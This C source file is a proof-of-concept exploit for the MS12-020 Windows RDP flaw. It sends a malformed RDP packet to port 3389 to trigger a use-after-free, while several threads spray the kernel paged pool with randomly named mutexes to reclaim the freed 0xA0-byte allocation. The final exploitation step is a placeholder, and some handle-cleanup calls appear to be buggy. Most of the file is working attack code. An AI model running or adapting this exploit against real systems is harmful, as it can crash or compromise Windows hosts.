#pragma warning (disable : 4996)

#define EXPLOIT_TARGET_PORT 3389
#define EXPLOIT_SPRAY_CPU_CORE_COUNT 7
#define EXPLOIT_PACKET_COUNT 1
#define EXPLOIT_SPRAY_COUNT 4194304

#define WIN32_LEAN_AND_MEAN

#include <Windows.h>
#include <stdlib.h>
#include <stdio.h>

#include <WinSock2.h>

// The raw packet data provided by Luigi Auriemma.
// If you want to analyze this, do not use a disassembler like what the people at ifconfig.dk did (https://ifconfig.dk/ms12-020/); this is not assembly code.
// Instead, try loading the packet data in some network analysis utility like Wireshark.
//
// No shade by the way, they seem to create cool blogs.
unsigned char g_pPacketData[] =
{
	0x03, 0x00, 0x00, 0x13, 0x0E, 0xE0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01,
	0x00, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x03, 0x00, 0x01, 0xD6, 0x02,
	0xF0, 0x80, 0x7F, 0x65, 0x82, 0x01, 0x94, 0x04, 0x01, 0x01, 0x04, 0x01,
	0x01, 0x01, 0x01, 0xFF, 0x30, 0x19, 0x02, 0x04, 0x00, 0x00, 0x00, 0x00,
	0x02, 0x04, 0x00, 0x00, 0x00, 0x02, 0x02, 0x04, 0x00, 0x00, 0x00, 0x00,
	0x02, 0x04, 0x00, 0x00, 0x00, 0x01, 0x02, 0x04, 0x00, 0x00, 0x00, 0x00,
	0x02, 0x04, 0x00, 0x00, 0x00, 0x01, 0x02, 0x02, 0xFF, 0xFF, 0x02, 0x04,
	0x00, 0x00, 0x00, 0x02, 0x30, 0x19, 0x02, 0x04, 0x00, 0x00, 0x00, 0x01,
	0x02, 0x04, 0x00, 0x00, 0x00, 0x01, 0x02, 0x04, 0x00, 0x00, 0x00, 0x01,
	0x02, 0x04, 0x00, 0x00, 0x00, 0x01, 0x02, 0x04, 0x00, 0x00, 0x00, 0x00,
	0x02, 0x04, 0x00, 0x00, 0x00, 0x01, 0x02, 0x02, 0x04, 0x20, 0x02, 0x04,
	0x00, 0x00, 0x00, 0x02, 0x30, 0x1C, 0x02, 0x02, 0xFF, 0xFF, 0x02, 0x02,
	0xFC, 0x17, 0x02, 0x02, 0xFF, 0xFF, 0x02, 0x04, 0x00, 0x00, 0x00, 0x01,
	0x02, 0x04, 0x00, 0x00, 0x00, 0x00, 0x02, 0x04, 0x00, 0x00, 0x00, 0x01,
	0x02, 0x02, 0xFF, 0xFF, 0x02, 0x04, 0x00, 0x00, 0x00, 0x02, 0x04, 0x82,
	0x01, 0x33, 0x00, 0x05, 0x00, 0x14, 0x7C, 0x00, 0x01, 0x81, 0x2A, 0x00,
	0x08, 0x00, 0x10, 0x00, 0x01, 0xC0, 0x00, 0x44, 0x75, 0x63, 0x61, 0x81,
	0x1C, 0x01, 0xC0, 0xD8, 0x00, 0x04, 0x00, 0x08, 0x00, 0x80, 0x02, 0xE0,
	0x01, 0x01, 0xCA, 0x03, 0xAA, 0x09, 0x04, 0x00, 0x00, 0xCE, 0x0E, 0x00,
	0x00, 0x48, 0x00, 0x4F, 0x00, 0x53, 0x00, 0x54, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x0C, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x01, 0xCA, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x07,
	0x00, 0x01, 0x00, 0x30, 0x00, 0x30, 0x00, 0x30, 0x00, 0x30, 0x00, 0x30,
	0x00, 0x2D, 0x00, 0x30, 0x00, 0x30, 0x00, 0x30, 0x00, 0x2D, 0x00, 0x30,
	0x00, 0x30, 0x00, 0x30, 0x00, 0x30, 0x00, 0x30, 0x00, 0x30, 0x00, 0x30,
	0x00, 0x2D, 0x00, 0x30, 0x00, 0x30, 0x00, 0x30, 0x00, 0x30, 0x00, 0x30,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x04, 0xC0, 0x0C, 0x00, 0x0D, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x02, 0xC0, 0x0C, 0x00, 0x1B, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x03, 0xC0, 0x2C, 0x00, 0x03, 0x00, 0x00, 0x00, 0x72, 0x64, 0x70,
	0x64, 0x72, 0x00, 0x00, 0x00, 0x00, 0x00, 0x80, 0x80, 0x63, 0x6C, 0x69,
	0x70, 0x72, 0x64, 0x72, 0x00, 0x00, 0x00, 0xA0, 0xC0, 0x72, 0x64, 0x70,
	0x73, 0x6E, 0x64, 0x00, 0x00, 0x00, 0x00, 0x00, 0xC0, 0x03, 0x00, 0x00,
	0x0C, 0x02, 0xF0, 0x80, 0x04, 0x01, 0x00, 0x01, 0x00, 0x03, 0x00, 0x00,
	0x08, 0x02, 0xF0, 0x80, 0x28, 0x03, 0x00, 0x00, 0x0C, 0x02, 0xF0, 0x80,
	0x38, 0x00, 0x06, 0x03, 0xEF, 0x03, 0x00, 0x00, 0x0C, 0x02, 0xF0, 0x80,
	0x38, 0x00, 0x06, 0x03, 0xEB, 0x03, 0x00, 0x00, 0x0C, 0x02, 0xF0, 0x80,
	0x38, 0x00, 0x06, 0x03, 0xEC, 0x03, 0x00, 0x00, 0x0C, 0x02, 0xF0, 0x80,
	0x38, 0x00, 0x06, 0x03, 0xED, 0x03, 0x00, 0x00, 0x0C, 0x02, 0xF0, 0x80,
	0x38, 0x00, 0x06, 0x03, 0xEE
};

// The template mutex name to use.
// This string will be allocated in the paged pool, taking a grand total of 0xA0 bytes.
// 0xA0 bytes is required as the allocation that we want to reclaim is... well, 0xA0 bytes in size.
unsigned char g_pMutexName[] =
{
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x00, 0x00
};

unsigned char g_StopSpray = 0;

unsigned char TriggerUAF(void)
{
	SOCKET Socket = INVALID_SOCKET;

	struct hostent* pHost = 0;
	unsigned char* pIP = 0;
	struct sockaddr_in SocketAddress = { 0 };

	pHost = gethostbyname("");
	if (!pHost)
	{
		return 1;
	}

	pIP = inet_ntoa(**(struct in_addr**)pHost->h_addr_list);
	if (!pIP)
	{
		return 1;
	}

	Socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (!Socket)
	{
		return 1;
	}

	SocketAddress.sin_family = AF_INET;
	SocketAddress.sin_addr.s_addr = inet_addr(pIP);
	SocketAddress.sin_port = htons(EXPLOIT_TARGET_PORT);
	if (connect(Socket, (const struct sockaddr*)&SocketAddress, sizeof(SocketAddress)))
	{
		return 1;
	}
	Sleep(1000);

	if (send(Socket, g_pPacketData, sizeof(g_pPacketData), 0) == SOCKET_ERROR)
	{
		return 1;
	}

	return 0;
}

DWORD WINAPI SprayPagedPool(void* pUnused)
{
	UNREFERENCED_PARAMETER(pUnused);

	PHANDLE phMutexes = 0;

	phMutexes = malloc(sizeof(HANDLE) * EXPLOIT_SPRAY_COUNT);
	if (!phMutexes)
	{
		printf("critical error, pls stop the exploit");
		getchar();
		return 1;
	}

	memset(phMutexes, 0, sizeof(HANDLE) * EXPLOIT_SPRAY_COUNT);

	while (!g_StopSpray)
	{
		for (unsigned long long i = 0; i < EXPLOIT_SPRAY_COUNT; i++)
		{
			// -2 to keep the Unicode null bytes
			// -8 to keep 8 bytes worth of 0x41's in memory (for analysis).
			for (unsigned long long j = 0; j < sizeof(g_pMutexName) - 2; j++)
			{
				g_pMutexName[j] = rand() % 0xFF;
			}

			phMutexes[i] = CreateMutexW(0, 0, (LPCWSTR)g_pMutexName);
		}

		for (unsigned long long i = 0; i < EXPLOIT_SPRAY_COUNT; i++)
		{
			if (!phMutexes[i])
			{
				continue;
			}

			CloseHandle(phMutexes);
		}
	}

	for (unsigned long long i = 0; i < EXPLOIT_SPRAY_COUNT; i++)
	{
		if (!phMutexes[i])
		{
			continue;
		}

		CloseHandle(phMutexes);
	}

	return 0;
}

int main(int argc, char** argv)
{
	UNREFERENCED_PARAMETER(argc);
	UNREFERENCED_PARAMETER(argv);

	WSADATA WinsockData = { 0 };

	HANDLE hThreads[EXPLOIT_SPRAY_CPU_CORE_COUNT] = { 0 };

	srand(GetTickCount());

	if (WSAStartup(MAKEWORD(2, 2), &WinsockData))
	{
		return 1;
	}

	for (unsigned long long i = 0; i < EXPLOIT_SPRAY_CPU_CORE_COUNT; i++)
	{
		hThreads[i] = CreateThread(0, 0, SprayPagedPool, 0, 0, 0);
		if (!hThreads[i])
		{
			return 1;
		}

		if (!SetThreadPriority(hThreads[i], THREAD_PRIORITY_TIME_CRITICAL))
		{
			return 1;
		}
	}

	printf("[!] Time to race on %d core(s)...\n", EXPLOIT_SPRAY_CPU_CORE_COUNT);
	Sleep(1000);

	for (unsigned long long i = 0; i < EXPLOIT_PACKET_COUNT; i++)
	{
		TriggerUAF();
	}

	printf("[*] Sleeping for 5000ms to ensure the packets went through...\n");
	Sleep(5000);

	g_StopSpray = 1;

	// Exploitation here

	WSACleanup();

	// TEMP
	printf("failed...");
	getchar();
	// TEMP
	return 0;
}